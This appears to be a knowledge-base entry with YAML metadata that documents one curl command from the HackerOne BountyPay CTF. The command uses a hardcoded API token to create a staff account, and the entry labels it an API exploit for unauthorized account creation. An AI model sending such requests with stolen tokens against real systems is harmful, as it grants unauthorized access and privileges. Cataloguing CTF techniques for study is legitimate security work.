---
data: >-
  curl -X POST 'https://api.bountypay.h1ctf.com/api/staff' -H 'X-Token:
  8e9998ee3137ca9ade8f372739f062c1' -d 'staff_id=STF:84DJKEIP38'
tags:
  - api
type: command
output: Success response with new account details
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:57.901Z'
id: 547206e1-108a-4ab1-b38a-0447fd3d1d3d
verified: false
validated: true
submitted: true
---
# curl-create-staff

## Command

```bash
curl -X POST 'https://api.bountypay.h1ctf.com/api/staff' -H 'X-Token: 8e9998ee3137ca9ade8f372739f062c1' -d 'staff_id=STF:84DJKEIP38'
```

## Description

Create staff account via API exploit.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -X POST | Method | Yes |
| -H | Token header | Yes |
| -d | Staff ID data | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://api.bountypay.h1ctf.com/api/staff' -H 'X-Token: 8e9998ee3137ca9ade8f372739f062c1' -d 'staff_id=STF:84DJKEIP38'
```

## Expected Output

JSON with account info.

## Related

- [[procedures/Create-Unauthorized-Staff-Account-via-API]]
